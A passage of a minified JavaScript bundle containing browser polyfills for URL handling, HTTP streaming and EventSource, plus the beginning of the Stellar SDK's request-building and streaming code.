    return !!(M !== null && (M != null && M.href) && (M != null && M.origin))
}
function getPathFromURLPosix(_) {
    if (_.hostname !== "")
        throw new TypeError('File URL host must be "localhost" or empty on browser');
    for (var M = _.pathname, j = 0; j < M.length; j++)
        if (M[j] === "%") {
            var O = M.codePointAt(j + 2) | 32;
            if (M[j + 1] === "2" && O === 102)
                throw new TypeError("File URL path must not include encoded / characters")
        }
    return decodeURIComponent(M)
}
function encodePathChars(_) {
    return _.includes("%") && (_ = _.replace(percentRegEx, "%25")),
    _.includes("\\") && (_ = _.replace(backslashRegEx, "%5C")),
    _.includes(`
`) && (_ = _.replace(newlineRegEx, "%0A")),
    _.includes("\r") && (_ = _.replace(carriageReturnRegEx, "%0D")),
    _.includes("	") && (_ = _.replace(tabRegEx, "%09")),
    _
}
var domainToASCII = function _(M) {
    if (typeof M > "u")
        throw new TypeError('The "domain" argument must be specified');
    return new URL$1("http://" + M).hostname
}
  , domainToUnicode = function _(M) {
    if (typeof M > "u")
        throw new TypeError('The "domain" argument must be specified');
    return new URL$1("http://" + M).hostname
}
  , pathToFileURL = function _(M) {
    var j = new URL$1("file://")
      , O = resolve(M)
      , x = M.charCodeAt(M.length - 1);
    return x === CHAR_FORWARD_SLASH && O[O.length - 1] !== "/" && (O += "/"),
    j.pathname = encodePathChars(O),
    j
}
  , fileURLToPath = function _(M) {
    if (!isURLInstance(M) && typeof M != "string")
        throw new TypeError('The "path" argument must be of type string or an instance of URL. Received type ' + typeof M + " (" + M + ")");
    var j = new URL$1(M);
    if (j.protocol !== "file:")
        throw new TypeError("The URL must be of scheme file");
    return getPathFromURLPosix(j)
}
  , formatImportWithOverloads = function _(M, j) {
    var O, x, w, b;
    if (j === void 0 && (j = {}),
    !(M instanceof URL$1))
        return formatImport(M);
    if (typeof j != "object" || j === null)
        throw new TypeError('The "options" argument must be of type object.');
    var X = (O = j.auth) != null ? O : !0
      , Y = (x = j.fragment) != null ? x : !0
      , F = (w = j.search) != null ? w : !0;
    (b = j.unicode) != null;
    var V = new URL$1(M.toString());
    return X || (V.username = "",
    V.password = ""),
    Y || (V.hash = ""),
    F || (V.search = ""),
    V.toString()
}
  , api = {
    format: formatImportWithOverloads,
    parse: parseImport,
    resolve: resolveImport,
    resolveObject,
    Url: UrlImport,
    URL: URL$1,
    URLSearchParams: URLSearchParams$2,
    domainToASCII,
    domainToUnicode,
    pathToFileURL,
    fileURLToPath
};
const url = Object.freeze(Object.defineProperty({
    __proto__: null,
    URL: URL$1,
    URLSearchParams: URLSearchParams$2,
    Url: UrlImport,
    default: api,
    domainToASCII,
    domainToUnicode,
    fileURLToPath,
    format: formatImportWithOverloads,
    parse: parseImport,
    pathToFileURL,
    resolve: resolveImport,
    resolveObject
}, Symbol.toStringTag, {
    value: "Module"
}))
  , require$$5 = getAugmentedNamespace(url);
var httpsBrowserify = {
    exports: {}
}, streamHttp = {}, request = {
    exports: {}
}, capability = {}, hasRequiredCapability;
function requireCapability() {
    return hasRequiredCapability || (hasRequiredCapability = 1,
    function(_) {
        _.fetch = x(window.fetch) && x(window.ReadableStream),
        _.writableStream = x(window.WritableStream),
        _.abortController = x(window.AbortController);
        var M;
        function j() {
            if (M !== void 0)
                return M;
            if (window.XMLHttpRequest) {
                M = new window.XMLHttpRequest;
                try {
                    M.open("GET", window.XDomainRequest ? "/" : "https://example.com")
                } catch {
                    M = null
                }
            } else
                M = null;
            return M
        }
        function O(w) {
            var b = j();
            if (!b)
                return !1;
            try {
                return b.responseType = w,
                b.responseType === w
            } catch {}
            return !1
        }
        _.arraybuffer = _.fetch || O("arraybuffer"),
        _.msstream = !_.fetch && O("ms-stream"),
        _.mozchunkedarraybuffer = !_.fetch && O("moz-chunked-arraybuffer"),
        _.overrideMimeType = _.fetch || (j() ? x(j().overrideMimeType) : !1);
        function x(w) {
            return typeof w == "function"
        }
        M = null
    }(capability)),
    capability
}
var response = {}, hasRequiredResponse;
function requireResponse() {
    if (hasRequiredResponse)
        return response;
    hasRequiredResponse = 1;
    var _ = requireCapability()
      , M = requireInherits_browser()
      , j = requireReadableBrowser$1()
      , O = response.readyStates = {
        UNSENT: 0,
        OPENED: 1,
        HEADERS_RECEIVED: 2,
        LOADING: 3,
        DONE: 4
    }
      , x = response.IncomingMessage = function(w, b, X, Y) {
        var F = this;
        if (j.Readable.call(F),
        F._mode = X,
        F.headers = {},
        F.rawHeaders = [],
        F.trailers = {},
        F.rawTrailers = [],
        F.on("end", function() {
            process$1.nextTick(function() {
                F.emit("close")
            })
        }),
        X === "fetch") {
            let ne = function() {
                K.read().then(function(oe) {
                    if (!F._destroyed) {
                        if (Y(oe.done),
                        oe.done) {
                            F.push(null);
                            return
                        }
                        F.push(Buffer.from(oe.value)),
                        ne()
                    }
                }).catch(function(oe) {
                    Y(!0),
                    F._destroyed || F.emit("error", oe)
                })
            };
            if (F._fetchResponse = b,
            F.url = b.url,
            F.statusCode = b.status,
            F.statusMessage = b.statusText,
            b.headers.forEach(function(oe, ue) {
                F.headers[ue.toLowerCase()] = oe,
                F.rawHeaders.push(ue, oe)
            }),
            _.writableStream) {
                var V = new WritableStream({
                    write: function(oe) {
                        return Y(!1),
                        new Promise(function(ue, fe) {
                            F._destroyed ? fe() : F.push(Buffer.from(oe)) ? ue() : F._resumeFetch = ue
                        }
                        )
                    },
                    close: function() {
                        Y(!0),
                        F._destroyed || F.push(null)
                    },
                    abort: function(oe) {
                        Y(!0),
                        F._destroyed || F.emit("error", oe)
                    }
                });
                try {
                    b.body.pipeTo(V).catch(function(oe) {
                        Y(!0),
                        F._destroyed || F.emit("error", oe)
                    });
                    return
                } catch {}
            }
            var K = b.body.getReader();
            ne()
        } else {
            F._xhr = w,
            F._pos = 0,
            F.url = w.responseURL,
            F.statusCode = w.status,
            F.statusMessage = w.statusText;
            var Q = w.getAllResponseHeaders().split(/\r?\n/);
            if (Q.forEach(function(ne) {
                var oe = ne.match(/^([^:]+):\s*(.*)/);
                if (oe) {
                    var ue = oe[1].toLowerCase();
                    ue === "set-cookie" ? (F.headers[ue] === void 0 && (F.headers[ue] = []),
                    F.headers[ue].push(oe[2])) : F.headers[ue] !== void 0 ? F.headers[ue] += ", " + oe[2] : F.headers[ue] = oe[2],
                    F.rawHeaders.push(oe[1], oe[2])
                }
            }),
            F._charset = "x-user-defined",
            !_.overrideMimeType) {
                var ee = F.rawHeaders["mime-type"];
                if (ee) {
                    var ae = ee.match(/;\s*charset=([^;])(;|$)/);
                    ae && (F._charset = ae[1].toLowerCase())
                }
                F._charset || (F._charset = "utf-8")
            }
        }
    }
    ;
    return M(x, j.Readable),
    x.prototype._read = function() {
        var w = this
          , b = w._resumeFetch;
        b && (w._resumeFetch = null,
        b())
    }
    ,
    x.prototype._onXHRProgress = function(w) {
        var b = this
          , X = b._xhr
          , Y = null;
        switch (b._mode) {
        case "text":
            if (Y = X.responseText,
            Y.length > b._pos) {
                var F = Y.substr(b._pos);
                if (b._charset === "x-user-defined") {
                    for (var V = Buffer.alloc(F.length), K = 0; K < F.length; K++)
                        V[K] = F.charCodeAt(K) & 255;
                    b.push(V)
                } else
                    b.push(F, b._charset);
                b._pos = Y.length
            }
            break;
        case "arraybuffer":
            if (X.readyState !== O.DONE || !X.response)
                break;
            Y = X.response,
            b.push(Buffer.from(new Uint8Array(Y)));
            break;
        case "moz-chunked-arraybuffer":
            if (Y = X.response,
            X.readyState !== O.LOADING || !Y)
                break;
            b.push(Buffer.from(new Uint8Array(Y)));
            break;
        case "ms-stream":
            if (Y = X.response,
            X.readyState !== O.LOADING)
                break;
            var Q = new window.MSStreamReader;
            Q.onprogress = function() {
                Q.result.byteLength > b._pos && (b.push(Buffer.from(new Uint8Array(Q.result.slice(b._pos)))),
                b._pos = Q.result.byteLength)
            }
            ,
            Q.onload = function() {
                w(!0),
                b.push(null)
            }
            ,
            Q.readAsArrayBuffer(Y);
            break
        }
        b._xhr.readyState === O.DONE && b._mode !== "ms-stream" && (w(!0),
        b.push(null))
    }
    ,
    response
}
var hasRequiredRequest;
function requireRequest() {
    if (hasRequiredRequest)
        return request.exports;
    hasRequiredRequest = 1;
    var _ = requireCapability()
      , M = requireInherits_browser()
      , j = requireResponse()
      , O = requireReadableBrowser$1()
      , x = j.IncomingMessage
      , w = j.readyStates;
    function b(V, K) {
        return _.fetch && K ? "fetch" : _.mozchunkedarraybuffer ? "moz-chunked-arraybuffer" : _.msstream ? "ms-stream" : _.arraybuffer && V ? "arraybuffer" : "text"
    }
    var X = request.exports = function(V) {
        var K = this;
        O.Writable.call(K),
        K._opts = V,
        K._body = [],
        K._headers = {},
        V.auth && K.setHeader("Authorization", "Basic " + Buffer.from(V.auth).toString("base64")),
        Object.keys(V.headers).forEach(function(ae) {
            K.setHeader(ae, V.headers[ae])
        });
        var Q, ee = !0;
        if (V.mode === "disable-fetch" || "requestTimeout"in V && !_.abortController)
            ee = !1,
            Q = !0;
        else if (V.mode === "prefer-streaming")
            Q = !1;
        else if (V.mode === "allow-wrong-content-type")
            Q = !_.overrideMimeType;
        else if (!V.mode || V.mode === "default" || V.mode === "prefer-fast")
            Q = !0;
        else
            throw new Error("Invalid value for opts.mode");
        K._mode = b(Q, ee),
        K._fetchTimer = null,
        K._socketTimeout = null,
        K._socketTimer = null,
        K.on("finish", function() {
            K._onFinish()
        })
    }
    ;
    M(X, O.Writable),
    X.prototype.setHeader = function(V, K) {
        var Q = this
          , ee = V.toLowerCase();
        F.indexOf(ee) === -1 && (Q._headers[ee] = {
            name: V,
            value: K
        })
    }
    ,
    X.prototype.getHeader = function(V) {
        var K = this._headers[V.toLowerCase()];
        return K ? K.value : null
    }
    ,
    X.prototype.removeHeader = function(V) {
        var K = this;
        delete K._headers[V.toLowerCase()]
    }
    ,
    X.prototype._onFinish = function() {
        var V = this;
        if (!V._destroyed) {
            var K = V._opts;
            "timeout"in K && K.timeout !== 0 && V.setTimeout(K.timeout);
            var Q = V._headers
              , ee = null;
            K.method !== "GET" && K.method !== "HEAD" && (ee = new Blob(V._body,{
                type: (Q["content-type"] || {}).value || ""
            }));
            var ae = [];
            if (Object.keys(Q).forEach(function(fe) {
                var he = Q[fe].name
                  , pe = Q[fe].value;
                Array.isArray(pe) ? pe.forEach(function(ye) {
                    ae.push([he, ye])
                }) : ae.push([he, pe])
            }),
            V._mode === "fetch") {
                var ne = null;
                if (_.abortController) {
                    var oe = new AbortController;
                    ne = oe.signal,
                    V._fetchAbortController = oe,
                    "requestTimeout"in K && K.requestTimeout !== 0 && (V._fetchTimer = window.setTimeout(function() {
                        V.emit("requestTimeout"),
                        V._fetchAbortController && V._fetchAbortController.abort()
                    }, K.requestTimeout))
                }
                window.fetch(V._opts.url, {
                    method: V._opts.method,
                    headers: ae,
                    body: ee || void 0,
                    mode: "cors",
                    credentials: K.withCredentials ? "include" : "same-origin",
                    signal: ne
                }).then(function(fe) {
                    V._fetchResponse = fe,
                    V._resetTimers(!1),
                    V._connect()
                }, function(fe) {
                    V._resetTimers(!0),
                    V._destroyed || V.emit("error", fe)
                })
            } else {
                var ue = V._xhr = new window.XMLHttpRequest;
                try {
                    ue.open(V._opts.method, V._opts.url, !0)
                } catch (fe) {
                    process$1.nextTick(function() {
                        V.emit("error", fe)
                    });
                    return
                }
                "responseType"in ue && (ue.responseType = V._mode),
                "withCredentials"in ue && (ue.withCredentials = !!K.withCredentials),
                V._mode === "text" && "overrideMimeType"in ue && ue.overrideMimeType("text/plain; charset=x-user-defined"),
                "requestTimeout"in K && (ue.timeout = K.requestTimeout,
                ue.ontimeout = function() {
                    V.emit("requestTimeout")
                }
                ),
                ae.forEach(function(fe) {
                    ue.setRequestHeader(fe[0], fe[1])
                }),
                V._response = null,
                ue.onreadystatechange = function() {
                    switch (ue.readyState) {
                    case w.LOADING:
                    case w.DONE:
                        V._onXHRProgress();
                        break
                    }
                }
                ,
                V._mode === "moz-chunked-arraybuffer" && (ue.onprogress = function() {
                    V._onXHRProgress()
                }
                ),
                ue.onerror = function() {
                    V._destroyed || (V._resetTimers(!0),
                    V.emit("error", new Error("XHR error")))
                }
                ;
                try {
                    ue.send(ee)
                } catch (fe) {
                    process$1.nextTick(function() {
                        V.emit("error", fe)
                    });
                    return
                }
            }
        }
    }
    ;
    function Y(V) {
        try {
            var K = V.status;
            return K !== null && K !== 0
        } catch {
            return !1
        }
    }
    X.prototype._onXHRProgress = function() {
        var V = this;
        V._resetTimers(!1),
        !(!Y(V._xhr) || V._destroyed) && (V._response || V._connect(),
        V._response._onXHRProgress(V._resetTimers.bind(V)))
    }
    ,
    X.prototype._connect = function() {
        var V = this;
        V._destroyed || (V._response = new x(V._xhr,V._fetchResponse,V._mode,V._resetTimers.bind(V)),
        V._response.on("error", function(K) {
            V.emit("error", K)
        }),
        V.emit("response", V._response))
    }
    ,
    X.prototype._write = function(V, K, Q) {
        var ee = this;
        ee._body.push(V),
        Q()
    }
    ,
    X.prototype._resetTimers = function(V) {
        var K = this;
        window.clearTimeout(K._socketTimer),
        K._socketTimer = null,
        V ? (window.clearTimeout(K._fetchTimer),
        K._fetchTimer = null) : K._socketTimeout && (K._socketTimer = window.setTimeout(function() {
            K.emit("timeout")
        }, K._socketTimeout))
    }
    ,
    X.prototype.abort = X.prototype.destroy = function(V) {
        var K = this;
        K._destroyed = !0,
        K._resetTimers(!0),
        K._response && (K._response._destroyed = !0),
        K._xhr ? K._xhr.abort() : K._fetchAbortController && K._fetchAbortController.abort(),
        V && K.emit("error", V)
    }
    ,
    X.prototype.end = function(V, K, Q) {
        var ee = this;
        typeof V == "function" && (Q = V,
        V = void 0),
        O.Writable.prototype.end.call(ee, V, K, Q)
    }
    ,
    X.prototype.setTimeout = function(V, K) {
        var Q = this;
        K && Q.once("timeout", K),
        Q._socketTimeout = V,
        Q._resetTimers(!1)
    }
    ,
    X.prototype.flushHeaders = function() {}
    ,
    X.prototype.setNoDelay = function() {}
    ,
    X.prototype.setSocketKeepAlive = function() {}
    ;
    var F = ["accept-charset", "accept-encoding", "access-control-request-headers", "access-control-request-method", "connection", "content-length", "cookie", "cookie2", "date", "dnt", "expect", "host", "keep-alive", "origin", "referer", "te", "trailer", "transfer-encoding", "upgrade", "via"];
    return request.exports
}
var immutable, hasRequiredImmutable;
function requireImmutable() {
    if (hasRequiredImmutable)
        return immutable;
    hasRequiredImmutable = 1,
    immutable = M;
    var _ = Object.prototype.hasOwnProperty;
    function M() {
        for (var j = {}, O = 0; O < arguments.length; O++) {
            var x = arguments[O];
            for (var w in x)
                _.call(x, w) && (j[w] = x[w])
        }
        return j
    }
    return immutable
}
var browser$1, hasRequiredBrowser$1;
function requireBrowser$1() {
    return hasRequiredBrowser$1 || (hasRequiredBrowser$1 = 1,
    browser$1 = {
        100: "Continue",
        101: "Switching Protocols",
        102: "Processing",
        200: "OK",
        201: "Created",
        202: "Accepted",
        203: "Non-Authoritative Information",
        204: "No Content",
        205: "Reset Content",
        206: "Partial Content",
        207: "Multi-Status",
        208: "Already Reported",
        226: "IM Used",
        300: "Multiple Choices",
        301: "Moved Permanently",
        302: "Found",
        303: "See Other",
        304: "Not Modified",
        305: "Use Proxy",
        307: "Temporary Redirect",
        308: "Permanent Redirect",
        400: "Bad Request",
        401: "Unauthorized",
        402: "Payment Required",
        403: "Forbidden",
        404: "Not Found",
        405: "Method Not Allowed",
        406: "Not Acceptable",
        407: "Proxy Authentication Required",
        408: "Request Timeout",
        409: "Conflict",
        410: "Gone",
        411: "Length Required",
        412: "Precondition Failed",
        413: "Payload Too Large",
        414: "URI Too Long",
        415: "Unsupported Media Type",
        416: "Range Not Satisfiable",
        417: "Expectation Failed",
        418: "I'm a teapot",
        421: "Misdirected Request",
        422: "Unprocessable Entity",
        423: "Locked",
        424: "Failed Dependency",
        425: "Unordered Collection",
        426: "Upgrade Required",
        428: "Precondition Required",
        429: "Too Many Requests",
        431: "Request Header Fields Too Large",
        451: "Unavailable For Legal Reasons",
        500: "Internal Server Error",
        501: "Not Implemented",
        502: "Bad Gateway",
        503: "Service Unavailable",
        504: "Gateway Timeout",
        505: "HTTP Version Not Supported",
        506: "Variant Also Negotiates",
        507: "Insufficient Storage",
        508: "Loop Detected",
        509: "Bandwidth Limit Exceeded",
        510: "Not Extended",
        511: "Network Authentication Required"
    }),
    browser$1
}
var hasRequiredStreamHttp;
function requireStreamHttp() {
    return hasRequiredStreamHttp || (hasRequiredStreamHttp = 1,
    function(_) {
        var M = requireRequest()
          , j = requireResponse()
          , O = requireImmutable()
          , x = requireBrowser$1()
          , w = require$$5
          , b = _;
        b.request = function(X, Y) {
            typeof X == "string" ? X = w.parse(X) : X = O(X);
            var F = window.location.protocol.search(/^https?:$/) === -1 ? "http:" : ""
              , V = X.protocol || F
              , K = X.hostname || X.host
              , Q = X.port
              , ee = X.path || "/";
            K && K.indexOf(":") !== -1 && (K = "[" + K + "]"),
            X.url = (K ? V + "//" + K : "") + (Q ? ":" + Q : "") + ee,
            X.method = (X.method || "GET").toUpperCase(),
            X.headers = X.headers || {};
            var ae = new M(X);
            return Y && ae.on("response", Y),
            ae
        }
        ,
        b.get = function(Y, F) {
            var V = b.request(Y, F);
            return V.end(),
            V
        }
        ,
        b.ClientRequest = M,
        b.IncomingMessage = j.IncomingMessage,
        b.Agent = function() {}
        ,
        b.Agent.defaultMaxSockets = 4,
        b.globalAgent = new b.Agent,
        b.STATUS_CODES = x,
        b.METHODS = ["CHECKOUT", "CONNECT", "COPY", "DELETE", "GET", "HEAD", "LOCK", "M-SEARCH", "MERGE", "MKACTIVITY", "MKCOL", "MOVE", "NOTIFY", "OPTIONS", "PATCH", "POST", "PROPFIND", "PROPPATCH", "PURGE", "PUT", "REPORT", "SEARCH", "SUBSCRIBE", "TRACE", "UNLOCK", "UNSUBSCRIBE"]
    }(streamHttp)),
    streamHttp
}
var hasRequiredHttpsBrowserify;
function requireHttpsBrowserify() {
    return hasRequiredHttpsBrowserify || (hasRequiredHttpsBrowserify = 1,
    function(_) {
        var M = requireStreamHttp()
          , j = require$$5
          , O = _.exports;
        for (var x in M)
            M.hasOwnProperty(x) && (O[x] = M[x]);
        O.request = function(b, X) {
            return b = w(b),
            M.request.call(this, b, X)
        }
        ,
        O.get = function(b, X) {
            return b = w(b),
            M.get.call(this, b, X)
        }
        ;
        function w(b) {
            if (typeof b == "string" && (b = j.parse(b)),
            b.protocol || (b.protocol = "https:"),
            b.protocol !== "https:")
                throw new Error('Protocol "' + b.protocol + '" not supported. Expected "https:"');
            return b
        }
    }(httpsBrowserify)),
    httpsBrowserify.exports
}
var eventsource, hasRequiredEventsource;
function requireEventsource() {
    if (hasRequiredEventsource)
        return eventsource;
    hasRequiredEventsource = 1;
    var _ = require$$5.parse
      , M = requireEvents$1()
      , j = requireHttpsBrowserify()
      , O = requireStreamHttp()
      , x = requireUtil$3()
      , w = ["pfx", "key", "passphrase", "cert", "ca", "ciphers", "rejectUnauthorized", "secureProtocol", "servername", "checkServerIdentity"]
      , b = [239, 187, 191]
      , X = 58
      , Y = 32
      , F = 10
      , V = 13;
    function K(ue) {
        return b.every(function(fe, he) {
            return ue[he] === fe
        })
    }
    function Q(ue, fe) {
        var he = Q.CONNECTING
          , pe = fe && fe.headers
          , ye = !1;
        Object.defineProperty(this, "readyState", {
            get: function() {
                return he
            }
        }),
        Object.defineProperty(this, "url", {
            get: function() {
                return ue
            }
        });
        var be = this;
        be.reconnectInterval = 1e3,
        be.connectionInProgress = !1;
        function xe(se) {
            he !== Q.CLOSED && (he = Q.CONNECTING,
            Z("error", new ee("error",{
                message: se
            })),
            L && (ue = L,
            L = null,
            ye = !1),
            setTimeout(function() {
                he !== Q.CONNECTING || be.connectionInProgress || (be.connectionInProgress = !0,
                U())
            }, be.reconnectInterval))
        }
        var Ae, Ee = "";
        pe && pe["Last-Event-ID"] && (Ee = pe["Last-Event-ID"],
        delete pe["Last-Event-ID"]);
        var Be = !1
          , ce = ""
          , q = ""
          , L = null;
        function U() {
            var se = _(ue)
              , de = se.protocol === "https:";
            if (se.headers = {
                "Cache-Control": "no-cache",
                Accept: "text/event-stream"
            },
            Ee && (se.headers["Last-Event-ID"] = Ee),
            pe) {
                var re = ye ? ne(pe) : pe;
                for (var $ in re) {
                    var ie = re[$];
                    ie && (se.headers[$] = ie)
                }
            }
            se.rejectUnauthorized = !(fe && !fe.rejectUnauthorized),
            fe && fe.createConnection !== void 0 && (se.createConnection = fe.createConnection);
            var ve = fe && fe.proxy;
            if (ve) {
                var ge = _(fe.proxy);
                de = ge.protocol === "https:",
                se.protocol = de ? "https:" : "http:",
                se.path = ue,
                se.headers.Host = se.host,
                se.hostname = ge.hostname,
                se.host = ge.host,
                se.port = ge.port
            }
            if (fe && fe.https) {
                for (var Re in fe.https)
                    if (w.indexOf(Re) !== -1) {
                        var Pe = fe.https[Re];
                        Pe !== void 0 && (se[Re] = Pe)
                    }
            }
            fe && fe.withCredentials !== void 0 && (se.withCredentials = fe.withCredentials),
            Ae = (de ? j : O).request(se, function(Ie) {
                if (be.connectionInProgress = !1,
                Ie.statusCode === 500 || Ie.statusCode === 502 || Ie.statusCode === 503 || Ie.statusCode === 504) {
                    Z("error", new ee("error",{
                        status: Ie.statusCode,
                        message: Ie.statusMessage
                    })),
                    xe();
                    return
                }
                if (Ie.statusCode === 301 || Ie.statusCode === 302 || Ie.statusCode === 307) {
                    var Te = Ie.headers.location;
                    if (!Te) {
                        Z("error", new ee("error",{
                            status: Ie.statusCode,
                            message: Ie.statusMessage
                        }));
                        return
                    }
                    var Le = oe(ue)
                      , Ze = oe(Te);
                    ye = Le !== Ze,
                    Ie.statusCode === 307 && (L = ue),
                    ue = Te,
                    process$1.nextTick(U);
                    return
                }
                if (Ie.statusCode !== 200)
                    return Z("error", new ee("error",{
                        status: Ie.statusCode,
                        message: Ie.statusMessage
                    })),
                    be.close();
                he = Q.OPEN,
                Ie.on("close", function() {
                    Ie.removeAllListeners("close"),
                    Ie.removeAllListeners("end"),
                    xe()
                }),
                Ie.on("end", function() {
                    Ie.removeAllListeners("close"),
                    Ie.removeAllListeners("end"),
                    xe()
                }),
                Z("open", new ee("open"));
                var $e = !0, Ne, qe = 0, Ve = -1;
                Ie.on("data", function(lt) {
                    Ne = Ne ? Buffer.concat([Ne, lt]) : lt,
                    $e && K(Ne) && (Ne = Ne.slice(b.length)),
                    $e = !1;
                    for (var nt = 0, je = Ne.length; nt < je; ) {
                        Be && (Ne[nt] === F && ++nt,
                        Be = !1);
                        for (var Ke = -1, Qe = Ve, We, mt = qe; Ke < 0 && mt < je; ++mt)
                            We = Ne[mt],
                            We === X ? Qe < 0 && (Qe = mt - nt) : We === V ? (Be = !0,
                            Ke = mt - nt) : We === F && (Ke = mt - nt);
                        if (Ke < 0) {
                            qe = je - nt,
                            Ve = Qe;
                            break
                        } else
                            qe = 0,
                            Ve = -1;
                        te(Ne, nt, Qe, Ke),
                        nt += Ke + 1
                    }
                    nt === je ? Ne = void 0 : nt > 0 && (Ne = Ne.slice(nt))
                })
            }),
            Ae.on("error", function(Ie) {
                be.connectionInProgress = !1,
                xe(Ie.message)
            }),
            Ae.setNoDelay && Ae.setNoDelay(!0),
            Ae.end()
        }
        U();
        function Z() {
            be.listeners(arguments[0]).length > 0 && be.emit.apply(be, arguments)
        }
        this._close = function() {
            he !== Q.CLOSED && (he = Q.CLOSED,
            Ae.abort && Ae.abort(),
            Ae.xhr && Ae.xhr.abort && Ae.xhr.abort())
        }
        ;
        function te(se, de, re, $) {
            if ($ === 0) {
                if (ce.length > 0) {
                    var ie = q || "message";
                    Z(ie, new ae(ie,{
                        data: ce.slice(0, -1),
                        lastEventId: Ee,
                        origin: oe(ue)
                    })),
                    ce = ""
                }
                q = void 0
            } else if (re > 0) {
                var ve = re < 0
                  , ge = 0
                  , Re = se.slice(de, de + (ve ? $ : re)).toString();
                ve ? ge = $ : se[de + re + 1] !== Y ? ge = re + 1 : ge = re + 2,
                de += ge;
                var Pe = $ - ge
                  , Ie = se.slice(de, de + Pe).toString();
                if (Re === "data")
                    ce += Ie + `
`;
                else if (Re === "event")
                    q = Ie;
                else if (Re === "id")
                    Ee = Ie;
                else if (Re === "retry") {
                    var Te = parseInt(Ie, 10);
                    Number.isNaN(Te) || (be.reconnectInterval = Te)
                }
            }
        }
    }
    eventsource = Q,
    x.inherits(Q, M.EventEmitter),
    Q.prototype.constructor = Q,
    ["open", "error", "message"].forEach(function(ue) {
        Object.defineProperty(Q.prototype, "on" + ue, {
            get: function() {
                var he = this.listeners(ue)[0];
                return he ? he._listener ? he._listener : he : void 0
            },
            set: function(he) {
                this.removeAllListeners(ue),
                this.addEventListener(ue, he)
            }
        })
    }),
    Object.defineProperty(Q, "CONNECTING", {
        enumerable: !0,
        value: 0
    }),
    Object.defineProperty(Q, "OPEN", {
        enumerable: !0,
        value: 1
    }),
    Object.defineProperty(Q, "CLOSED", {
        enumerable: !0,
        value: 2
    }),
    Q.prototype.CONNECTING = 0,
    Q.prototype.OPEN = 1,
    Q.prototype.CLOSED = 2,
    Q.prototype.close = function() {
        this._close()
    }
    ,
    Q.prototype.addEventListener = function(fe, he) {
        typeof he == "function" && (he._listener = he,
        this.on(fe, he))
    }
    ,
    Q.prototype.dispatchEvent = function(fe) {
        if (!fe.type)
            throw new Error("UNSPECIFIED_EVENT_TYPE_ERR");
        this.emit(fe.type, fe.detail)
    }
    ,
    Q.prototype.removeEventListener = function(fe, he) {
        typeof he == "function" && (he._listener = void 0,
        this.removeListener(fe, he))
    }
    ;
    function ee(ue, fe) {
        if (Object.defineProperty(this, "type", {
            writable: !1,
            value: ue,
            enumerable: !0
        }),
        fe)
            for (var he in fe)
                fe.hasOwnProperty(he) && Object.defineProperty(this, he, {
                    writable: !1,
                    value: fe[he],
                    enumerable: !0
                })
    }
    function ae(ue, fe) {
        Object.defineProperty(this, "type", {
            writable: !1,
            value: ue,
            enumerable: !0
        });
        for (var he in fe)
            fe.hasOwnProperty(he) && Object.defineProperty(this, he, {
                writable: !1,
                value: fe[he],
                enumerable: !0
            })
    }
    function ne(ue) {
        var fe = {};
        for (var he in ue)
            /^(cookie|authorization)$/i.test(he) || (fe[he] = ue[he]);
        return fe
    }
    function oe(ue) {
        return typeof ue == "string" && (ue = _(ue)),
        !ue.protocol || !ue.hostname ? "null" : (ue.protocol + "//" + ue.host).toLowerCase()
    }
    return eventsource
}
var hasRequiredCall_builder;
function requireCall_builder() {
    if (hasRequiredCall_builder)
        return call_builder;
    hasRequiredCall_builder = 1,
    Object.defineProperty(call_builder, "__esModule", {
        value: !0
    }),
    call_builder.CallBuilder = void 0;
    var _ = require$$0$2, M = _.__importDefault(requireBrowser$2()), j = _.__importDefault(requireURI()), O = _.__importDefault(requireURITemplate()), x = requireErrors$1(), w = _.__importDefault(requireHorizon_axios_client()), b = require$$2.version, X = ["transaction"], Y, F = window;
    F.EventSource ? Y = F.EventSource : M.default ? Y = requireEventsource() : Y = F.window.EventSource;
    var V = function() {
        function K(Q) {
            this.url = Q.clone(),
            this.filter = [],
            this.originalSegments = this.url.segment() || []
        }
        return K.prototype.call = function() {
            var Q = this;
            return this.checkFilter(),
            this._sendNormalRequest(this.url).then(function(ee) {
                return Q._parseResponse(ee)
            })
        }
        ,
        K.prototype.stream = function(Q) {
            var ee = this;
            Q === void 0 && (Q = {}),
            this.checkFilter(),
            this.url.setQuery("X-Client-Name", "js-stellar-sdk"),
            this.url.setQuery("X-Client-Version", b);
            var ae, ne, oe = function() {
                ne = setTimeout(function() {
                    ae && ae.close(),
                    ae = ue()
                }, Q.reconnectTimeout || 15 * 1e3)
            }, ue = function() {
                try {
                    ae = new Y(ee.url.toString())
                } catch (be) {
                    Q.onerror && Q.onerror(be)
                }
                if (oe(),
                ae) {
                    var fe = !1
                      , he = function() {
                        fe || (clearTimeout(ne),
                        ae.close(),
                        ue(),
                        fe = !0)
                    }
                      , pe = function(be) {
                        if (be.type === "close") {
                            he();
                            return
                        }
                        var xe = be.data ? ee._parseRecord(JSON.parse(be.data)) : be;
                        xe.paging_token && ee.url.setQuery("cursor", xe.paging_token),
                        clearTimeout(ne),
                        oe(),
                        typeof Q.onmessage < "u" && Q.onmessage(xe)
                    }
                      , ye = function(be) {
                        Q.onerror && Q.onerror(be)
                    };
                    ae.addEventListener ? (ae.addEventListener("message", pe.bind(ee)),
                    ae.addEventListener("error", ye.bind(ee)),
                    ae.addEventListener("close", he.bind(ee))) : (ae.onmessage = pe.bind(ee),
                    ae.onerror = ye.bind(ee))
                }
                return ae
            };
            return ue(),
            function() {
                clearTimeout(ne),
                ae && ae.close()
            }
        }
        ,
        K.prototype.cursor = function(Q) {
            return this.url.setQuery("cursor", Q),
            this
        }
        ,
        K.prototype.limit = function(Q) {
            return this.url.setQuery("limit", Q.toString()),
            this
        }
        ,
        K.prototype.order = function(Q) {
            return this.url.setQuery("order", Q),
            this
        }
        ,
        K.prototype.join = function(Q) {
            return this.url.setQuery("join", Q),
            this
        }
        ,
        K.prototype.checkFilter = function() {
            if (this.filter.length >= 2)
                throw new x.BadRequestError("Too many filters specified",this.filter);
            if (this.filter.length === 1) {
                var Q = this.originalSegments.concat(this.filter[0]);
                this.url.segment(Q)
            }
        }
        ,
        K.prototype._requestFnForLink = function(Q) {
            var ee = this;
            return function(ae) {
                return ae === void 0 && (ae = {}),
                _.__awaiter(ee, void 0, void 0, function() {
                    var ne, oe, ue;
                    return _.__generator(this, function(fe) {
                        switch (fe.label) {
                        case 0:
                            return Q.templated ? (oe = O.default(Q.href),
                            ne = j.default(oe.expand(ae))) : ne = j.default(Q.href),
                            [4, this._sendNormalRequest(ne)];
                        case 1:
                            return ue = fe.sent(),
                            [2, this._parseResponse(ue)]
                        }
                    })
                })
            }
        }
        ,
